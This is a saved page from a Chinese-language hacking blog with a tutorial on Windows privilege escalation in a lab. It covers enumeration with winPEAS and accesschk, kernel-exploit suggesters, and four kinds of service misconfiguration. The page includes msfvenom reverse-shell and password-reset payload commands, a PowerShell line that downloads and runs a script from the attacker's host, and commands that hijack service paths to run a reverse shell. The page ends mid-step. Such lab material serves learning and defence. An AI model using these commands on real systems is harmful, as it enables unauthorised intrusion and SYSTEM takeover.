@@ -1,0 +1,1101 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-material.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="windows提权基础知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows Privilege Escalation">
+<meta property="og:url" content="http://evilarsene.icu/2020/08/31/Windows-Privilege-Escalation/index.html">
+<meta property="og:site_name" content="Love ❤ Hacking">
+<meta property="og:description" content="windows提权基础知识">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-08-31T05:30:18.000Z">
+<meta property="article:modified_time" content="2020-10-15T18:03:27.680Z">
+<meta property="article:author" content="EvilArsene">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://evilarsene.icu/2020/08/31/Windows-Privilege-Escalation/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Windows Privilege Escalation | Love ❤ Hacking</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/TZESS" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Love ❤ Hacking</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">trickster</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2020/08/31/Windows-Privilege-Escalation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="EvilArsene">
+      <meta itemprop="description" content="人格面具操控者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Love ❤ Hacking">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows Privilege Escalation
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-08-31 13:30:18" itemprop="dateCreated datePublished" datetime="2020-08-31T13:30:18+08:00">2020-08-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-16 02:03:27" itemprop="dateModified" datetime="2020-10-16T02:03:27+08:00">2020-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8FWindows/" itemprop="url" rel="index"><span itemprop="name">后渗透Windows</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="普通账户"><a href="#普通账户" class="headerlink" title="普通账户"></a>普通账户</h3><p>通常使用<strong>User accounts</strong>登录windows机器<br>windows默认中有一个本地<strong>Administrator</strong>账号<br>还有几个可能存在的默认账户(比如<strong>Guest</strong>)</p>
+<h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><p><strong>service accounts</strong>用来启动服务，不用使用它登录windows<br>其中<strong>SYSTEM</strong>账户是一个默认的服务账户，它具有最高权限<br>其他默认服务账户包括NETWORK SERVICE和LOCAL SERVICE</p>
+<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>用户账户可以属于不同的组<br><strong>Groups</strong>可以方便的管理权限，如常见的组:Administrators,Users<br>还有一种组称为<strong>Pseudo-groups</strong>(比如Authenticated Users)，会根据其作用，动态调整组内的成员</p>
+<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>这里的资源指:目录或文件，注册表，服务<br>用户对于它们的权限基于<strong>access control list(ACL)</strong><br>ACL由<strong>aceess control entries(ACEs)组成</strong><br>ACE规定了重要用户(user和group)和其他用户的权限</p>
+<h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>Windows虚拟机:<a target="_blank" rel="noopener" href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></p>
+<table>
+<thead>
+<tr>
+<th>Windows ip</th>
+<th>Kali ip</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>192.168.110.9</td>
+<td>192.168.110.3</td>
+</tr>
+</tbody></table>
+<p>测试的环境下，我们会预先获得一个windows user shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure>
+
+<p>或者某些提权，会使用RDP在GUI下进行提权</p>
+<p>补充:某些情况下，reverse_shell不一定能稳定连接，我们可以进行migrate这样的方式，或者在高权限下执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;exec CMD&#x3D;&#39;net user administrator password123!&#39; -f exe -o test.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="工具选择"><a href="#工具选择" class="headerlink" title="工具选择"></a>工具选择</h2><p>提权中，主要是基于当前环境的枚举，所以我们会使用一些自动化枚举工具，减少时间<br>比如综合的工具:winpeas,seatbelt,powerup,sharpup<br>其中主要会使用winpeas，因为winpeas带有颜色的重点标注非常友好</p>
+<p>另外，还会使用AccessChk，这是一个古老但仍然使用的工具，它可以检查用户或组对文件，目录，服务和注册表的访问权限<br>这里不会使用最新版本，最新版会出现一个GUI弹窗。我们将使用老版，执行时会带有参数/accepteula去同意EULA</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>内核是任何操作系统的核心，可以把它想象成介于软件应用与电脑硬件的中间层，它具有对于操作系统的完全控制权，因此如果利用内核漏洞进行攻击，最后可以获得SYSTEM权限</p>
+<h3 id="发现与利用"><a href="#发现与利用" class="headerlink" title="发现与利用"></a>发现与利用</h3><p>通常我们会通过一个程序来发现和利用内核漏洞，整个流程如下</p>
+<ol>
+<li>通过如<code>systeminfo</code>这样的命令来枚举windows的具体版本以及补丁安装情况</li>
+<li>针对这些信息寻找漏洞利用程序(ExploitDB,Google,Github)</li>
+<li>编译并执行</li>
+</ol>
+<p>但需注意，内核提权通常不是稳定的，它可能会直接造成系统的崩溃，所以根据经验，这应该是提权的最后手段</p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>metasploit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure>
+
+<p>sherlock</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;192.168.110.3&#x2F;winpriv&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>
+
+<p>Windows-Exploit-Suggester(需要将systeminfo复制到一个文件里)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --update</span><br><span class="line">python windows-exploit-suggester.py -d 2020-09-11-mssb.xls -i test.txt</span><br></pre></td></tr></table></figure>
+
+<p>wes.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wes.py systeminfo.txt -i &#39;Elevation of Privilege&#39; --exploits-only | less</span><br></pre></td></tr></table></figure>
+
+<p>watson(依赖.Net,所以要先枚举对方的.Net版本:C:\windows\microsoft.net\framework)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\watson</span><br></pre></td></tr></table></figure>
+
+<h2 id="Services-Exploits"><a href="#Services-Exploits" class="headerlink" title="Services Exploits"></a>Services Exploits</h2><p>服务是运行在后台的常规任务，它可以接受用户输入。如果服务以系统权限运行并且配置错误，它会导致能够SYSTEM权限执行任意命令</p>
+<h3 id="手动枚举服务"><a href="#手动枚举服务" class="headerlink" title="手动枚举服务"></a>手动枚举服务</h3><p>获取服务名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get displayname,name</span><br></pre></td></tr></table></figure>
+
+<p>查询服务配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe qc &lt;name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查询服务当前状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe query &lt;name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改服务配置(注意这里=必须紧跟option)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config &lt;name&gt; &lt;option&gt;&#x3D; &lt;value&gt;</span><br></pre></td></tr></table></figure>
+
+<p>启动/停止服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start&#x2F;stop &lt;name&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>利用服务提权的方式有很多，常见的有5种</p>
+<ol>
+<li>Insecure Service Properties</li>
+<li>Unquoted Service Path</li>
+<li>Weak Registry Permissions</li>
+<li>Insecure Service Executables</li>
+<li>DLL Hijacking</li>
+</ol>
+<h4 id="Insecure-Service-Properties"><a href="#Insecure-Service-Properties" class="headerlink" title="Insecure Service Properties"></a>Insecure Service Properties</h4><p>每个服务都会通过ACL来规定用户对它的权限<br>有些是无害的，比如(SERVICE_QUERY_CONFIG，SERVICE_QUERY_STATUS)<br>有些可能有用，比如(SERVICE_STOP，SERVICE_START)<br>有些是危险的，比如(SERVICE_CHANGE_CONFIG,SERVICE_CHANGE_CONFIG)</p>
+<p>如果我们有权限可以修改运行在SYSTEM权限下服务的配置信息，就去修改其执行的二进制文件的路径<br><strong>注意</strong>：如果你可以修改一个服务的配置，但是不能启动或停止该服务，你可能不能利用它来进行提权</p>
+<p>演示</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
+
+<p>另外accesschk.exe也可以枚举</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwcqv user *</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>关注有漏洞的服务</li>
+</ol>
+<p>![1](/images/windows privilege escalation/1.png)</p>
+<p>![2](/images/windows privilege escalation/2.png)</p>
+<ol start="3">
+<li>accesschk进一步检查权限</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwcqv user daclsvc</span><br></pre></td></tr></table></figure>
+
+
+
+<p>![3](/images/windows privilege escalation/3.png)</p>
+<p>发现有我们提权所需的权限</p>
+<ol start="4">
+<li>确认服务的配置信息</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc daclsvc</span><br></pre></td></tr></table></figure>
+
+<p>![4](/images/windows privilege escalation/4.png)</p>
+<p>从中重点关注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">START_TYPE         : 3   DEMAND_START											&#x2F;&#x2F;可以手动启动</span><br><span class="line">BINARY_PATH_NAME   : &quot;C:\Program Files\DACL Service\daclservice.exe&quot;			&#x2F;&#x2F;文件执行路径</span><br><span class="line">DEPENDENCIES       : 															&#x2F;&#x2F;程序执行没有依赖</span><br><span class="line">SERVICE_START_NAME : LocalSystem												&#x2F;&#x2F;服务确实以SYSTEM来运行</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="5">
+<li>检查当前运行状态</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc query daclsvc</span><br></pre></td></tr></table></figure>
+
+<p>![5](/images/windows privilege escalation/5.png)</p>
+<p>这里为STOPPED，表示我们修改完准备利用的配置后，直接启动服务即可</p>
+<ol start="6">
+<li>重新设置</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config daclsvc binpath&#x3D; &quot;\&quot;C:\PrivEsc\reverse.exe\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>最简单的提权方式，就是修改binpath为我们准备好的reverse_shell</p>
+<ol start="7">
+<li>设置好监听后，启动该服务</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start daclsvc</span><br></pre></td></tr></table></figure>
+
+<p>![6](/images/windows privilege escalation/6.png)</p>
+<h4 id="Unquoted-Service-Path"><a href="#Unquoted-Service-Path" class="headerlink" title="Unquoted Service Path"></a>Unquoted Service Path</h4><p>windows的可执行程序可以在不需要扩展名的情况下运行(如whoami.exe只需要whoami即可运行)<br>一些可执行文件会接受参数，用空格符分隔，如program.exe agr1 agr2….<br>当使用不带引号且包含空格绝对路径时，这会导致歧义</p>
+<p>比如这样的路径<code>C:\Program Files\Some Dir\SomeProgram.exe</code>，正常来看，它执行的是SomeProgram.exe<br>但对于windows来说，<code>C:\Program</code>可以是一个可执行程序，它携带两个参数<code>Files\Some</code>和<code>Dir\ SomeProgram.exe</code><br>windows会依次检查这种潜在可能性来进行排除。如果我们可以写入一个可执行文件在windows检查原本可执行文件之前，可以诱使服务去执行它们</p>
+<p>演示</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
+
+<p>在<code>Interesting Services -non Microsoft</code>条目里发现<code>No quotes and Space detected</code></p>
+<p>![7](/images/windows privilege escalation/7.png)</p>
+<ol start="2">
+<li>检查服务的配置</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc unquotedsvc</span><br></pre></td></tr></table></figure>
+
+<p>![8](/images/windows privilege escalation/8.png)</p>
+<p>从路径，我们得到利用路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</span><br><span class="line"></span><br><span class="line">可利用</span><br><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Unquoted.exe</span><br><span class="line">C:\Program Files\Unquoted Path Service\Common.exe</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>检查一下服务的权限，重点看我们是否有启动/停止权限</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user unquotedsvc</span><br></pre></td></tr></table></figure>
+
+<p>![9](/images/windows privilege escalation/9.png)</p>
+<ol start="4">
+<li>依次检查可利用路径是否可以写入文件</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq C:\</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq &quot;C:\Program Files\&quot;</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq &quot;C:\Program Files\Unquoted Path Service\&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![10](/images/windows privilege escalation/10.png)</p>
+<p>看来在路径<code>C:\Program Files\Unquoted Path Service\</code>下<code>RW BUILTIN\Users</code>组的用户拥有W权限，这也是我们用户所在的组</p>
+<ol start="5">
+<li>复制我们提前准备好的reverse_shell的exe文件到利用目录，并改名</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\Unquoted Path Service\Common.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![11](/images/windows privilege escalation/11.png)</p>
+<ol start="6">
+<li>开启端口监听，并启动服务</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start unquotedsvc</span><br></pre></td></tr></table></figure>
+
+<p>![12](/images/windows privilege escalation/12.png)</p>
+<h4 id="Weak-Registry-Permissions"><a href="#Weak-Registry-Permissions" class="headerlink" title="Weak Registry Permissions"></a>Weak Registry Permissions</h4><p>windows的注册表存储每个服务的条目。注册表项也会使用ACL管理权限，如果ACL配置错误，即使不能直接修改服务，也可以修改服务的配置</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
+
+<p>![13](/images/windows privilege escalation/13.png)</p>
+<p>发现了当前用户可以修改服务regsvc的注册表条目</p>
+<ol start="2">
+<li>使用powershell或accesschk进一步检查我们对注册表的权限</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\PrivEsc&gt;powershell -exec bypass</span><br><span class="line">PS C:\PrivEsc&gt; Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc |Format-List</span><br></pre></td></tr></table></figure>
+
+<p>![14](/images/windows privilege escalation/14.png)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc</span><br></pre></td></tr></table></figure>
+
+<p>![15](/images/windows privilege escalation/15.png)</p>
+<p>注意<code>NT AUTHORITY\INTERACTIVE</code>组具有RW权限，这个组的成员包含所有能够登录到系统的成员，其中就有我们当前的用户</p>
+<ol start="3">
+<li>检查我们是否能够启动/停止服务</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user regsvc</span><br></pre></td></tr></table></figure>
+
+<p>![16](/images/windows privilege escalation/16.png)</p>
+<ol start="4">
+<li>检查当前注册表的值</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc</span><br></pre></td></tr></table></figure>
+
+<p>![17](/images/windows privilege escalation/17.png)</p>
+<p>从中我们知道了可执行程序的绝对路径和该服务以SYSTEM运行</p>
+<ol start="5">
+<li>接下来就和修改服务启动路径的方法一致，替换为我们的reverse_shell，不同点使这次我们通过修改注册表的值来完成</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc &#x2F;v ImagePath &#x2F;t REG_EXPAND_SZ &#x2F;d C:\PrivEsc\reverse.exe &#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p>![18](/images/windows privilege escalation/18.png)</p>
+<ol start="6">
+<li>开启监听，启动服务</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start regsvc</span><br></pre></td></tr></table></figure>
+
+<p>![19](/images/windows privilege escalation/19.png)</p>
+<h4 id="Insecure-Service-Executables"><a href="#Insecure-Service-Executables" class="headerlink" title="Insecure Service Executables"></a>Insecure Service Executables</h4><p>如果用户可直接修改原始服务的可执行文件，我们可以直接用我们的reverse_shell来代替<br>这种操作具有危险性，正式渗透中应该先备份服务文件</p>
+<p>演示</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
+
+<p>![20](/images/windows privilege escalation/20.png)</p>
+<p>在<code>Interesting Services -non Microsoft</code>条目下发现<code>File Permissions: Everyone [AllAccess]</code></p>
+<ol start="2">
+<li>accesschk检查文件权限</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -quvw &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![21](/images/windows privilege escalation/21.png)</p>
+<ol start="3">
+<li>检查我们是否能够启动/停止服务</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvqc filepermsvc</span><br></pre></td></tr></table></figure>
+
+<p>![22](/images/windows privilege escalation/22.png)</p>
+<ol start="4">
+<li>安全备份原始文件，并将reverse_shell的exe文件对其进行替换</li>
+</ol>
